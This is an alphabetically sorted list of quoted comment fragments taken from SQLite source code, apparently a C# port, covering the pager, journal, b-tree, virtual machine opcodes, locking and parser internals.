" If the inner loop was generated using a non-null pOrderBy argument,"
" If the input FuncDef structure is ephemeral, then free it.  If"
" If the input token is $, then fail the parse."
" If the interrupted SQL operation is an INSERT, UPDATE, or DELETE"
" If the invoked function returns non-zero, then the commit becomes a"
" If the isCommit flag is set, there is no need to remember that"
" If the isDirectMode flag is zero, then this is done by calling"
" If the journal does not exist, it usually means that some"
" If the journal file is already open (as it may be in exclusive mode),"
" If the journal file is an in-memory journal file, no action need"
" If the journal file is not yet open when this function is called,"
" If the journal file is open, then it is ""finalized"". Once a journal"
" If the journal file is opened (or if it is already open), then a"
" If the journal header file appears to be corrupted, SQLITE_DONE is"
" If the journal really is hot, reset the pager cache prior rolling"
" If the key is not an INTEGER PRIMARY KEY, then create a unique"
" If the left hand expression has a collating sequence type, then it is"
" If the left side is ""database.id"" then pId1 is the database name"
" If the look-ahead token is YYNOCODE, then check to see if the action is"
" If the lower four bits equal SQLITE_SYNC_FULL, that means"
" If the magic name "":memory:"" will create an in-memory database, then"
" If the main database file is not open, or an exclusive lock is not"
" If the main journal file has already been opened, ensure that the"
" If the module has been registered and includes a Create method, "
" If the nByte argument is less than zero, then zSql is read up to the"
" If the nFin parameter is non-zero, this function assumes"
" If the name cannot be resolved unambiguously, leave an error message"
" If the negFlag parameter is true, that means that zNum really represents"
" If the new Btree uses a sharable pBtShared, then link the new"
" If the new limit is a negative number, the limit is unchanged."
" If the next character is a digit, this is a floating point"
" If the noContent flag is set, it means that we do not care about"
" If the number of references to the page drop to zero, then the"
" If the object is not sharable, then no mutex is ever required"
" If the open statement-transaction is not closed here, then the user"
" If the operation described by (2) above is not attempted, and if the"
" If the optimization cannot be used, 0 is returned. If it can be used,"
" If the optimization was not enabled at compile time, then the"
" If the optional ""KEY z"" syntax is omitted, an SQL NULL is passed as the"
" If the output is destined for a temporary table, open that table."
" If the pParse.declareVtab flag is set, do not delete any table"
" If the pSelect argument is not NULL, it means that this routine"
" If the page containing the entry to delete is not a leaf page, move"
" If the page size is changed, then this function uses sqlite3PagerMalloc()"
" If the page size is not changed, either because one of the enumerated"
" If the pager has already entered the error state, do not attempt"
" If the pager has not already entered the error state, but an IO or"
" If the pager is already in the error state, return the error code. "
" If the pager is currently in error state, discard the contents of"
" If the pager is in PAGER_RESERVED state, then attempt (1). Whether"
" If the pager is in RESERVED state, then there must be a copy of this"
" If the pager is in error state when this function is called, then the"
" If the pager is in peristent-journal mode, then the physical"
" If the pager is in the error state when this function is called, it"
" If the pager is in the error state, return an error immediately. "
" If the pager is running in exclusive mode and is in PAGER_SYNCED state,"
" If the pager was opened on a transient file (zFilename==""""), or"
" If the parameter is named, then its name appears in P4 and P3==1."
" If the parameter is not _QUERY, then the journal_mode is set to the"
" If the parent page becomes overfull, the overflow cell or cells"
" If the parse is successful, write the number of minutes"
" If the payload for a cell is larger than the max payload, then extra"
" If the payload will not fit completely on the local page, we have"
" If the pgno argument passed to PTRMAP_PAGENO is a pointer-map page,"
" If the prNotFound parameter is 0, then the b-tree will be used to iterate"
" If the prNotFound parameter is not 0, then the b-tree will be used"
" If the progress callback returns non-zero, exit the virtual machine with"
" If the progress callback returns non-zero, the operation is"
" If the query is a ""SELECT min(x)"", then the loop coded by"
" If the query was read-only, we need do no rollback at all. Otherwise,"
" If the record does exist, then fall thru.  The cursor is left"
" If the record is no longer present in the table, jump to the"
" If the record is stored in a cursor, the complete record text"
" If the record number will change, push the record number as it"
" If the record page-number is illegal (0 or PAGER_MJ_PGNO), or"
" If the reference count has reached zero, rollback any active"
" If the register is a temporary register that can be deallocated,"
" If the requested collation sequence is not available, or not available"
" If the requested page is already in the cache, it is returned."
" If the requested page is already in the page cache, then a pointer to"
" If the required locks were successfully obtained, open the journal"
" If the resetFlg is true, then the counter is reset to zero after this"
" If the result is a UTF-16 string, then sqlite3_column_bytes() converts"
" If the result set column is a simple column reference, then this routine"
" If the right-hand side is also a column, then the affinities"
" If the same database is attached more than once, the first"
" If the second argument is SQLITE_IOERR, SQLITE_CORRUPT, or SQLITE_FULL"
" If the second argument to this function is NULL, generate a"
" If the seekResult parameter is 0, then cursor pCur may point to any"
" If the seekResult parameter is non-zero, then a successful call to"
" If the set membership test fails, then the result of the"
" If the shared-data extension is enabled, there may be multiple users"
" If the sibling page assembled above was not the right-most sibling,"
" If the siblings are on leaf pages, then the child pointers of the"
" If the source page size is smaller than the destination page size,"
" If the source page-size is smaller than the destination page-size,"
" If the source pager is currently in a write-transaction, return"
" If the specified column is ""rowid"", ""oid"" or ""_rowid_"" and an"
" If the specified table is actually a view, an [error code] is returned."
" If the sqlite_sequence table exists in this database, then update"
" If the sqlite_stat1 tables does not previously exist, it is created."
" If the statement is successfully recompiled, return SQLITE_OK. Otherwise,"
" If the statement journal is open and the page is not in it,"
" If the statement was executed successfully or not executed at all, then"
" If the string is pure numeric, set "
" If the sub-query is a compound SELECT statement, then (by restrictions"
" If the subjInMemory argument is non-zero, then any sub-journal opened"
" If the system is so sick that we are unable to allocate a mutex,"
" If the table has a virtual root page, then the cursor is moved to point"
" If the table has an INTEGER PRIMARY KEY, then Table.iPKey is the index of"
" If the table or index is empty and P2>0, then jump immediately to P2."
" If the table scan does not satisfy the ORDER BY clause, increase"
" If the total query only selects a single row, then the ORDER BY"
" If the translation is between UTF-16 little and big endian, then"
" If the tree is a leaf-data tree, and the siblings are leaves,"
" If the trigger name was unqualified, and the table is a temp table,"
" If the two statements contain a different number of bindings, then"
" If the update-hook will be invoked, set iKey to the rowid of the"
" If the value is being opened for writing, check that the"
" If the value is numeric, convert it to a string first."
" If the value is numeric, convert it to a string using the"
" If the value is text or blob, try to convert it to an integer using the"
" If the value is text or blob, try to convert it to an using the"
" If the value of register P1 is 1 or greater, jump to P2."
" If the value of register P1 is exactly 0, jump to P2."
" If the value of register P1 is less than zero, jump to P2."
" If the value passed as the second argument is out of range, return"
" If the wtFlags argument includes TERM_DYNAMIC, then responsibility"
" If the xBegin call is successful, place the sqlite3_vtab pointer"
" If the xMutexAlloc method has not been set, then the user did not"
" If there are FOR EACH ROW triggers, allocate cursors for the"
" If there are TEMP triggers on this table, modify the sqlite_temp_master"
" If there are any outstanding VMs, return SQLITE_BUSY. "
" If there are any write-transactions at all, invoke the commit hook "
" If there are currently more than pcache.nMaxPage pages allocated, try"
" If there are inequality constraints, check that the value"
" If there are multiple triggers, you might of some BEFORE and some AFTER."
" If there are no aggregate functions in the result-set, and no GROUP BY"
" If there are no other statements currently running, then"
" If there are no virtual tables configured in this schema, the"
" If there are row triggers, close all cursors then invoke"
" If there are triggers, close all the cursors after each iteration"
" If there is a LIMIT clause, the parser sets nLimit to the value of the"
" If there is a NOT NULL constraint, then the default value for the"
" If there is a transaction in progress, this routine is a no-op."
" If there is an ORDER BY clause, increase the scan cost to account"
" If there is an ORDER BY clause, then this sorting"
" If there is an ORDER BY clause, then we need to sort the results"
" If there is an ORDER BY, the call to"
" If there is anything other than a rowset object in memory cell P1,"
" If there is are a sequence of queries, do the earlier ones first."
" If there is data, jump to P2 "
" If there is no blocking connection, the callback is invoked immediately,"
" If there is no match, a NULL pointer is returned."
" If there is no match, return 0.  Return -1 if an error occurs."
" If there is no open read-transaction on the source database, open"
" If there is no open transaction, then mark this as a special"
" If there is no statement handle, then the blob-handle has"
" If there is no type specified, columns have the default affinity"
" If there is not currently a writer, then BtShared.isPending must"
" If there is, then we consider this journal to be hot. If not,"
" If there was a master journal and this routine will return success,"
" If there were a failure, the prepared statement would have halted"
" If they are not NULL, the piOldColMask and piNewColMask output variables"
" If this Btree is a candidate for shared cache, try to find an"
" If this b-tree database is not shareable, or if the client is reading"
" If this fails, or if opening the file failed, then close the file and"
" If this function returns successfully, it may be assumed that the"
" If this happens, then the specified callback is invoked immediately,"
" If this index has achieved the lowest cost so far, then use it."
" If this is a CREATE TABLE xx AS SELECT ..., execute the SELECT"
" If this is a TEMPORARY table, write the entry into the auxiliary"
" If this is a delete operation to remove a row from a table b-tree,"
" If this is a leaf page or the tree is not an int-key tree, then"
" If this is a no-op implementation, implement everything as macros."
" If this is a problem for you, do not use the interface at this time."
" If this is a real table, attempt conversions as required by the"
" If this is a release of the outermost savepoint, truncate"
" If this is a rollback operation, playback the specified savepoint."
" If this is a savepoint rollback, then memory may have to be dynamically"
" If this is a scalar select that is part of an expression, then"
" If this is a temp-file, it is possible that the journal file has"
" If this is a virtual table, invoke the xRename() function if"
" If this is an AUTOINCREMENT table, look up the sequence number in the"
" If this is an EXPLAIN, skip this step "
" If this is an INSERT on a view with an INSTEAD OF INSERT trigger,"
" If this is an UPDATE OF <column-list> trigger,"
" If this is an auto-vacuum database, the call to copyNodeContent()"
" If this is an auto-vacuum database, update the pointer map"
" If this is an auto-vacuum database, update the pointer-map entries"
" If this is an in-memory db, or no pages have been written to, or this"
" If this is an insert into a table b-tree, invalidate any incrblob"
" If this is an intKey table, then the above call to BtreeKeySize()"
" If this is not a temporary or in-memory file and, the journal file is"
" If this is not a view, open the table and and all indices "
" If this is the first header read from the journal, truncate the"
" If this is the first overflow page, then write a partial entry"
" If this is the first row, then generate an extra row containing"
" If this is the magic sqlite_sequence table used by autoincrement,"
" If this is the right table of a LEFT OUTER JOIN, allocate and"
" If this limit is changed, then the compiled library is technically"
" If this match occurred in the left table of a natural join,"
" If this routine fails for any reason, it might leave the database"
" If this routine returns non-zero, the lock is retried.  If it"
" If this scan uses an index, make code substitutions to read data"
" If this statement was prepared using sqlite3_prepare_v2(), and an"
" If this transaction has made the database smaller, then all pages"
" If this vdbe did create the sqlite_stat1 table, then it must have"
" If this was an INSERT, UPDATE or DELETE and no statement transaction"
" If this was page 1, then restore the value of Pager.dbFileVers."
" If tracing is enabled (by the sqlite3_trace()) interface, then"
" If true, LHS of IN operator is a rowid "
" If true, bias the search to the high end "
" If true, create page if it does not exist already "
" If true, jump if either operand is NULL "
" If true, retrieve from the btree key, not data. "
" If unable to initialize the malloc subsystem, then return early."
" If virtual-tables are in use, this is not just an optimization."
" If we are creating a set for an ""expr IN (SELECT ...)"" construct,"
" If we are currently testing IO errors, then do not call OsAccess() to"
" If we are doing a reverse order scan on an ascending index, or"
" If we are holding a PENDING lock that ought to be released, then"
" If we are trying to delete from a view, realize that view into"
" If we are trying to update a view, realize that view into"
" If we are unable to rollback, quit and return the error"
" If we compile with SQLITE_OMIT_TRIGGER, all of the computation needed"
" If we compile with the SQLITE_TEST macro set, then the following block"
" If we compiled with the SQLITE_NO_SYNC flag, then syncing is a"
" If we flatten the above, we would get"
" If we get here it means the result set contains one or more """
" If we get this far, it means either:"
" If we get this far, it means that the page needs to be"
" If we get this far, it means we need to compute the table names."
" If we have an INTEGER PRIMARY KEY, make sure the primary key"
" If we have not already resolved the name, then maybe"
" If we have read more header data than was contained in the header,"
" If we never rollback a statement transaction, then statement"
" If we reach this point, flattening is permitted. "
" If we reach this point, it means that execution is finished with"
" If we reach this point, it means that pExpr refers to a table"
" If we reach this point, then the P3 value must be a floating"
" If we succeeded in making the shared memory handle, map it. "
" If where.c is able to produce results sorted in this order, then"
" If wrFlag==1, then the cursor can be used for reading or for"
" If wrFlag==null, then the cursor can only be used for reading."
" If writing out a page causes the database file to grow, Pager.dbFileSize"
" If x is a blob, then we count bytes."
" If x is a lower-case ASCII character, then its upper-case equivalent"
" If you are unlucky, one of those deleted indices or tables might"
" If z is a NULL pointer, set pMem to contain an SQL NULL. "
" If zDatabase is 0, all databases are searched for the table and the"
" If zDatabase is 0, all databases are searched for the"
" If zFilename is "":memory:"" then an in-memory database is created"
" If zMaster is a NULL pointer (occurs for a single database transaction),"
" If zNum represents an integer that will fit in 32-bits, then set"
" Implementation of the IFNULL(), NVL(), and COALESCE() functions."
" Implementation of the NULLIF(x,y) function.  The result is the first"
" Implementation of the TRIM(), LTRIM(), and RTRIM() functions."
" In SQLite version 3.5.0 and 3.5.1, it was possible to define"
" In SQLite, we never try to destroy a parser that was not successfully"
" In a NATURAL join, omit the join columns from the"
" In a join with a USING clause, omit columns in the"
" In a join, this routine might be called multiple times for the"
" In all other cases, SQLITE_OK is returned."
" In an SQLite index record, the serial type is stored directly before"
" In any case, all savepoints with an index greater than iSavepoint"
" In case this is such a statement, close any statement transaction"
" In cases like this, replace pExpr with a copy of the expression that"
" In debug mode, we mark all persistent databases as sharable"
" In direct mode, reference the sorting index rather"
" In either case, before playback commences the Pager.dbSize variable"
" In its default configuration, SQLite API routines return one of 26 integer"
" In its first form, this pragma returns the encoding of the main"
" In most cases, we should be able to acquire the lock we"
" In order for the operator to be optimizible, the RHS must be a string"
" In order for this routine to work, the calling function must have"
" In order to facilitate testing on a WinNT system, the test fixture"
" In other words, ALWAYS and NEVER are added for defensive code."
" In other words, if a subsequent malloc (ex: ""b"") worked, it is assumed"
" In other words, if call like this:"
" In other words, the analysis stops as soon as reg(P1) errors are"
" In other words, the initial "":"" or ""$"" or ""@"" or """
" In other words, you should call sqlite3_column_text(),"
" In practice, metadata is preserved between function calls for"
" In some cases, the call to btreeMoveto() below is a no-op. For"
" In sqlite3_snprintf() routine is similar to ""snprintf()"" from"
" In that case, delete the subtrees pLeft and pRight."
" In that cases, the constants below can be ORed together."
" In the ""v2"" interfaces, the prepared statement"
" In the AltB, AeqB, and AgtB subroutines, an EOF on A following nextA"
" In the SQL strings input to [sqlite3_prepare_v2()] and its variants,"
" In the Table structure describing Ex1, nCol==3 because there are"
" In the case of an update, this is the [rowid] after the update takes place."
" In the course of balancing the page and its siblings, cells may be"
" In the current implementation, the update hook"
" In the example, there are three indexed terms connected by OR."
" In the external interface, an ""sqlite3_stmt"
" In the first form, the "
" In the legacy interface, the return value will be either [SQLITE_BUSY],"
" In the parameter forms shown above NNN is an integer literal,"
" In the previous sentence and in the diagram, ""slot[]"" refers to"
" In the usual case where WSD is supported, the SQLITE_WSD and GLOBAL"
" In theory, it is only necessary to write the 28 bytes that the"
" In this case (db->nStatement==0), and there is nothing to do."
" In this case the caller must call sqlite3DbFree(db, ) on "
" In this case, call balance_nonroot() to redistribute cells"
" In this case, temporarily copy the cell into the aOvflSpace[]"
" In this implementation, a single file can hold one or more separate"
" In this implementation, error checking is provided for testing"
" In this mode, write each query result to the key of the temporary"
" In this routine, the ""p"" parameter is a pointer to the outer query."
" In this second case, wtFlag as the TERM_ORINFO set and eOperator==WO_OR"
" In this version of BtreeMoveto, pKey is a packed index record"
" In those routines that have a fourth argument, its value is the"
" In version 1.0.x of SQLite, the VACUUM command would call"
" Incomplete updates may be rolled back and transactions canceled,"
" Index of ""the page"" in pParent "
" Index of vdbe cursor to ""new"" temp table "
" Index of vdbe cursor to ""old"" temp table "
" Index structure corresponding to zIndex, if any "
" Initialize all database files - the main database file, the file"
" Initialize the counter of the number of rows deleted, if"
" Initialize the state of the random number generator once,"
" Insert a new cell on pPage at cell index ""i"".  pCell points to the"
" Insert a new record into the BTree.  The key is given by (pKey,nKey)"
" Insert an element into the hash table pH.  The key is pKey,nKey"
" Insert code into ""v"" that will push the record on the top of the"
" Instead of a lock on the b-tree rooted at page iRoot, the caller may"
" Instead of trying to balance the 3 right-most leaf pages, just add"
" Instead, invoke the unlock-notify callback with the context"
" Instead, the entire table should be passed to //sqlite3_free_table() when"
" Int64.TryParse( ""-"" "
" Integer types.  %d, %x, %o, and so forth "
" Interfaces for opening a shared library, finding entry points"
" Internally, the vdbe manipulates nearly all SQL values as Mem"
" Interpret the given string as a safety level.  Return 0 for OFF,"
" Invalidate temp storage, either when the temp storage is changed"
" Invalidate the overflow page-list cache for cursor pCur, if any."
" It is easier just to erase the whole table.  Note, however, that"
" It is illegal for P1 and P3 to be the same register. Sometimes,"
" It is slightly faster than calling sqlite3StrICmp() directly, but"
" It might be the case that multiple tables are indexable.  For example,"
" Jump to here for any other kind of fatal error.  The ""rc"" variable"
" Jump to label ""D"" "
" Jump to the instruction at address P1, P2, or P3 depending on whether"
" Just before the shared-btree is closed, the function passed as the"
" Keywords include: in1, in2, in3, out2_prerelease, out2, out3.  See"
" LRU list, then this function is a no-op."
" Label ""L"" "
" Left operand:  0==FALSE, 1==TRUE, 2==UNKNOWN or NULL "
" Less than 19 digits, so we know that it fits in 64 bits "
" Like malloc(), but remember the size of the allocation"
" Like sqlite3MPrintf(), but call //sqlite3DbFree() on zStr after formatting"
" List of table triggers, if required "
" List of triggers on pTab, if required "
" Locate a VFS by name.  If no name is given, simply return the"
" Locate a user function given a name, a number of arguments and a flag"
" Locate the index named by the INDEXED BY clause, if any. "
" Lock the destination database, if it is not locked already. "
" Locking in windows is manditory.  For this reason, we cannot store"
" Look up every table that is named in pSrc.  If any table is not found,"
" Loop through the tables in the main database. For each, do"
" Macros to determine whether the machine is big or little endian,"
" Make pRoot, the root page of the b-tree, writable. Allocate a new"
" Make sure ""isView"" gets undefined in case this file becomes part of"
" Make sure it is not a system table being altered, or a reserved name"
" Make sure the column name is unique.  If the name is not unique,"
" Make sure the page is marked as clean. If it isn't clean already,"
" Make sure the page is marked as dirty. If it isn't dirty already,"
" Make sure wsFlags is initialized to some sane value. Otherwise, if the"
" Make the given Mem object MEM_Dyn.  In other words, make it so"
" Malloc may fail when setting the page-size, as there is an internal"
" Maximum bit index.  Max iSize is 4,294,967,296. "
" Mem structure. Otherwise, any existing buffer is freed and the"
" MemPage.aOvfl[] array), they are not copied to pTo."
" MemTranslate() may return SQLITE_OK or SQLITE_NOMEM. If NOMEM is returned,"
" Memory corruption, a segmentation fault, or other severe error"
" Memory space needed to hold p, in bytes "
" Minor point: If this is the case, then the expression will be"
" More specificly, this function attempts to re-organize the"
" Most malloc failures are non-benign. After they occur, SQLite"
" Move the date backwards to the beginning of the current day,"
" MoveTo now.  If no move is pending, check to see if the row has been"
" MovetoUnpacked() to seek cursor pCur to (pKey, nKey) has already"
" Must be compatible with this index, if not NULL "
" NULL is returned.  If non-NULL is returned, then it is guaranteed"
" NULL value, then "
" NULL, in which case the corresponding element of metadata is omitted."
" NULL, the caller expects a table b-tree. If this is not the case,"
" NULL, then a NULL is stored in P2."
" NULL, then just return the other expression."
" NULL.  If a memory allocation fails, the pParse.db.mallocFailed flag"
" NULLs are less than numbers, numbers are less than strings,"
" Name of new table, or database name "
" Name of table containing column, or NULL "
" Name of the collating sequence, UTF-8 encoded "
" Name of the connection operator, used for error messages."
" Name of the database containing table, or NULL "
" Name of the view, trigger, or index "
" NameContexts can be nested.  When resolving names, the inner-most"
" Need to call sqlite3ExprDelete(db, ref pExpr) "
" Next is all token values, in a form suitable for use by makeheaders."
" No page should ever be explicitly rolled back that is in use, except"
" No process holds a RESERVED or greater lock on the database file, and"
" Normally, iSavepoint is greater than or equal to zero. However, if op is"
" Normally, whenever a table is dropped, all associated triggers are"
" Note that ON cannot be a database, table or column name, so"
" Note that if an error occurred, it might be the case that"
" Note that if zMaster==NULL, this does not overwrite a previous value"
" Note that in order for this to work, code must be generated in the"
" Note that setting READ_UNCOMMITTED overrides most lock detection,"
" Note that terms of the form ""table.column1=table.column2"" (the"
" Note that the number is in the usual order, not reversed as with"
" Note that this can never happen in an SQLite data file, as all"
" Note that when this routine is called, some of the cells on the page"
" Note that when type conversions occur, pointers returned by prior"
" Note that with flags==EXPRDUP_REDUCE, this routines works on full-size"
" Note, however, that sqlite3_config() can be called as part of the"
" Note: during a reduce, the only symbols destroyed are those"
" Note: this cast is safe, because the origin data point was an int"
" Notice that because of the way SQLite parses compound SELECTs, the"
" Now that no other errors can occur, finish filling in the BtCursor"
" Now that there is a read-lock on the source database, query the"
" Now, if the table is not stored in the temp database, reload any temp"
" Nul-terminated UTF-8 string <value>, or NULL "
" Number of cells on this page, local and ovfl "
" Number of characters in string value, excluding '"
" Numeric values associated with these states are OFF==1, NORMAL=2,"
" OCELOT, and Firebird all work.  The SQL92 spec explicitly says this"
" OE_Abort for IMMEDIATE, OE_Rollback for DEFERRED "
" OE_Abort, OE_Ignore, OE_Replace, or OE_None "
" OMIT_TEMPDB is set to 1 if SQLITE_OMIT_TEMPDB is defined, or 0"
" ON CONFLICT clauses this is an error. Otherwise, use the"
" OP_Column to the default value, if any."
" OP_Halt, or OP_ResultRow.  Typically the OP_Permutation should occur"
" OP_Last : OP_Rewind, iCur, addrBrk )"
" OP_String8 : OP_Null, 0, 5, 0, zCol, 0 )"
" ORDER BY clause, this routine returns 0."
" ORDER BY term, that is OK.  Just ignore that column of the index"
" OS layer for an embedded system, if you use this file as an example,"
" OS's standard temporary file directory, and are deleted prior to exit."
" Obtain the BtShared mutex associated with B-Tree handle p. Also,"
" Obtain the mutex p. If some other thread already has the mutex, block"
" Obtain the mutex p. If successful, return SQLITE_OK. Otherwise, if another"
" Offset into the cell bodies, for c"
" Often, v-tables store their data in other SQLite tables, which"
" Old value of pPg.pgno, if sync is required "
" On WinNT/2K/XP systems, LockFileEx() and UnlockFileEx() are available,"
" On all subsequent invocations, the pseudo-randomness is generated"
" On each invocation of the co-routine, it puts a single row of the"
" On machines with a small stack size, you can redefine the"
" On recent Windows platforms, the localtime_s() function is available"
" On sqlite.flags, the SQLITE_InTrans value means that we have"
" On success, SQLITE_OK is returned."
" On success, [SQLITE_OK] is returned and the new [BLOB handle] is written"
" On success, [SQLITE_OK] is returned, otherwise an [error code] is returned."
" On systems that cannot tolerate large memory allocations, nField"
" On systems with ample stack space and that support alloca(), make"
" On the other hand, if nFin is greater than zero, then keep"
" On the other hand, it does burn CPU cycles every time through"
" On the other hand, the use of -ffast-math comes with the following"
" Once all the cookies have been verified and transactions opened,"
" Once all the other databases have been initialised, load the schema"
" Once an overflow page-list cache has been allocated, it may be"
" Once any conversions have taken place, and neither value is NULL,"
" Once sqlite3_backup_step() has returned [SQLITE_DONE], or when the "
" Once the SELECT has been coded by sqlite3Select(), it is in a"
" Once the lock has been upgraded and, if necessary, the file opened,"
" Once this is routine has returned, the only thing required to commit"
" One of SQLITE_NULL, SQLITE_TEXT, SQLITE_INTEGER, etc "
" One of TK_ALL, TK_UNION, TK_EXCEPT, TK_INTERSECT "
" One of TK_BEFORE, TK_AFTER, TK_INSTEAD "
" One of TK_DELETE, TK_UPDATE, TK_INSERT         "
" One of TK_DELETE, TK_UPDATE, TK_INSERT, TK_SELECT "
" One of TK_INSERT, TK_UPDATE, TK_DELETE "
" One of TK_UPDATE, TK_INSERT, TK_DELETE "
" One of TRIGGER_BEFORE, TRIGGER_AFTER "
" One side is a column, the other is not. Use the columns affinity. "
" Only changes that are directly specified by the [INSERT], [UPDATE],"
" Only the column names are computed.  Column.zType, Column.zColl,"
" Only the data content may only be modified, it is not possible to"
" Only valid for real tables, no pseudotables "
" Opcode 5 works on the linear array only, not on the Bitvec."
" Open a read-only cursor, execute the OP_Count, close the cursor. "
" Open existing file, or create if it doesn't exist "
" Open the database file. If the btree is successfully opened, use"
" Open the sub-journal, if it is not already opened. "
" Open, release or rollback the savepoint named by parameter P4, depending"
" Opens a file, only if it exists. "
" Or a database, table and column:  ID.ID.ID"
" Or if overrideError==OE_Default, then the pParse.onError parameter"
" Or if the destination has a UNIQUE index and is not empty,"
" Or the ""zulu"" notation:"
" Or, if the page size has already been fixed, return SQLITE_READONLY"
" Or, in pseudo-code:"
" Or, it might might be the case that the file on disk is smaller than"
" Ordinarily, if no value is explicitly provided, SQLite creates databases"
" OsFile, do nothing. Don't use the end_lock: exit path, as"
" Other values of n (P4_STATIC, P4_COLLSEQ etc.) indicate that zP4 points"
" Otherwise, SQLITE_OK is returned."
" Otherwise, a new page object is allocated and populated with data"
" Otherwise, an  [error code] or an [extended error code] is returned."
" Otherwise, an [error code] or an [extended error code] is returned."
" Otherwise, another connection with journal_mode=delete might"
" Otherwise, any active savepoints are released."
" Otherwise, attempt to obtain the lock using sqlite3OsLock(). Invoke"
" Otherwise, fall thru into the TK_COLUMN case "
" Otherwise, for non-temporary files, the effective sector size is"
" Otherwise, if all of the following are true:"
" Otherwise, if an error is encountered (i.e. an IO error or database"
" Otherwise, if argument isClearTable is false, then the row with"
" Otherwise, if everything is successful, SQLITE_OK is returned. If an"
" Otherwise, if everything is successful, then SQLITE_OK is returned"
" Otherwise, if successful, a pointer to an [sqlite3_backup] object is"
" Otherwise, if the device does not support the SAFE_APPEND property,"
" Otherwise, if the entry deleted was on an internal node page, then"
" Otherwise, if the optimization is both enabled and applicable,"
" Otherwise, it may pass NULL."
" Otherwise, make arrangements to invoke xNotify when pOther drops"
" Otherwise, request the page from the PCache layer. "
" Otherwise, return SQLITE_OK."
" Otherwise, return an error."
" Otherwise, sync the database file for the btree pBt. zMaster points to"
" Otherwise, the schema is loaded. An error code is returned."
" Otherwise, the value i is redirected into one of BITVEC_NPTR"
" Otherwise, this instruction checks if cursor P1 contains an entry"
" Otherwise, treat the ORDER BY term as an ordinary expression "
" Otherwise, we have our own implementation that works on most systems."
" Otherwise, when the transaction is rolled back, the logic in"
" P->xCodec(P->pCodec,D,N,X)==0 ){ E"
" P1 is the result code returned by sqlite3_exec(), sqlite3_reset(),"
" P2. Otherwise, fall through to the next instruction."
" P3==0 means the main database, P3==1 means the database used for"
" P3==3 is the recommended pager cache size, and so forth.  P1==0 is"
" P4 is a pointer to a virtual table object, an sqlite3_vtab structure."
" P4 may be a pointer to an sqlite3_vtab structure. If so, call the"
" PAGER_LOCKINGMODE_EXCLUSIVE, indicating the current (possibly updated)"
" PAGER_LOCKINGMODE_EXCLUSIVE. If the parameter is not _QUERY, then"
" PAGER_UNLOCK, _SHARED, _RESERVED, etc. "
" PENDING, or EXCLUSIVE lock on the file.  It returns true"
" PENDING_LOCK may not be passed directly to sqlite3OsLock(). Instead, a"
" PRIMARY KEY into which a NULL is being inserted, that NULL will be"
" PRNG and restore the PRNG to its saved state at a later time, or"
" PRNG_SAVE.  If PRNG_SAVE has never before been called, then"
" PTRMAP_ISPAGE(pBt, iLastPg))"
" PTRMAP_ISPAGE(pBt, maxRootPgno))"
" PTRMAP_ISPAGE(pBt, pPgno))"
" PTRMAP_PAGENO( pBt, nOrig ) "
" Pages are then played back from the sub-journal file, starting"
" Parameter P4 may point to a string containing the table-name, or"
" Parameters of the form """
" Perform a single step of an incremental-vacuum. If successful,"
" Playback savepoint pSavepoint. Or, if pSavepoint==NULL, then playback"
" Pointer to Data for the current row, if all on one page "
" Possibly because the free-list is empty, or possibly because the"
" Pragma ""quick_check"" is an experimental reduced version of"
" Preallocated, blank file handle "
" Preferred text encoding (SQLITE_UTF8, 16LE, 16BE) "
" Prefix character.  """
" Prior to SQLite version 3.5.0, this routine only constrained the memory"
" Prior to version 3.1.2, when LIMIT and OFFSET had to be simple constants,"
" Process NATURAL keywords, and ON and USING clauses of joins."
" Properties such as ""out2"" or ""jump"" that are specified in"
" Push an authorization context.  After this routine is called, the"
" Push onto the stack, data for all columns of the new entry, beginning"
" Query the database.  But instead of invoking a callback for each row,"
" RESTRICT, SETNULL, and CASCADE actions apply only to foreign keys."
" Read the database schema. If an error occurs, leave an error message"
" Read the master journal name from the journal, if it is present."
" Regardless of mxPage, return the current maximum page count."
" Regardless of the value of mxPage, return the maximum page count."
" Regardless of whether this is a RELEASE or ROLLBACK, destroy all"
" Register a callback to be invoked each time a row is updated,"
" Register all built-in functions, but do not attempt to read the"
" Reload the table, index and permanent trigger schemas. "
" Remove the given index from the index hash table, and free"
" Remove trailing zeros and the ""."" if no digits follow the ""."" "
" Repeat the above with the next record to be updated, until"
" Report an error message, and throw away the input token."
" Reset the safety level, in case the fullfsync flag or synchronous"
" Resize the hash table so that it cantains ""new_size"" buckets."
" Resolve label ""x"" to be the address of the next instruction to"
" Resolve the GROUP BY clause.  At the same time, make sure"
" Restriction 17: If the sub-query is a compound SELECT, then it must"
" Restriction 3:  If the subquery is a join, make sure the subquery is"
" Return 0 if it is not open, or non-zero (but not 1) if it is."
" Return SQLITE_OK if everything is successful, or an SQLite error"
" Return SQLITE_OK if everything is successful. Otherwise, return"
" Return SQLITE_OK if everything works, or an error code otherwise."
" Return SQLITE_OK on success.  If a memory allocation error occurs,"
" Return a list of all dirty pages in the cache, sorted by page number."
" Return a pointer corresponding to database zDb (i.e. ""main"", ""temp"")"
" Return a pointer to the ""temporary page"" buffer held internally"
" Return a pointer to the Pager.nExtra bytes of ""extra"" space"
" Return data, whatever."
" Return the auxillary data pointer, if any, for the iArg'th argument to"
" Return the opcode for a given address.  If the address is -1, then"
" Return true (non-zero) if we are running under WinNT, Win2K, WinXP,"
" Return true if the BtShared mutex is held on the btree, or if the"
" Right operand: 0==FALSE, 1==TRUE, 2==UNKNOWN or NULL "
" Round the union size down to the nearest pointer boundary, since that's how"
" Routines used to compute the sum, average, and total."
" Rowid is stored in this register, if not zero "
" Run the BEFORE and INSTEAD OF triggers, if there are any"
" SAVEPOINT_RELEASE. If it is SAVEPOINT_ROLLBACK, then the statement"
" SAVEPOINT_ROLLBACK, then iSavepoint may also be -1. In this case the"
" SELECT statement.  Return the index i of the matching column,"
" SELECT... statement are columns, then numeric affinity is used"
" SHARED to RESERVED, or when upgrading from SHARED to EXCLUSIVE"
" SQL function or aggregate, pass NULL for all three function callbacks."
" SQL parameter is used more than once, second and subsequent"
" SQL parameters of the form """
" SQL statement, UTF-16 encoded "
" SQL statement, UTF-8 encoded "
" SQL statements below, as the v-table implementation may be storing"
" SQL statements from an untrusted source, to ensure that the SQL statements"
" SQL statements. It is illegal to open, release or rollback any"
" SQL-style comments from ""--"" to end of line "
" SQLITE_AFF_TEXT, SQLITE_AFF_INTEGER, and so forth. An attempt is made"
" SQLITE_BIG_DBL. If a plan is found that uses the named index,"
" SQLITE_BUSY when trying to upgrade from no-lock to a SHARED lock,"
" SQLITE_DEFAULT_AUTOVACUUM is true. On the other hand, if"
" SQLITE_DEFAULT_PAGE_SIZE,"
" SQLITE_DONE is returned. If it is not finished, but no error occurred,"
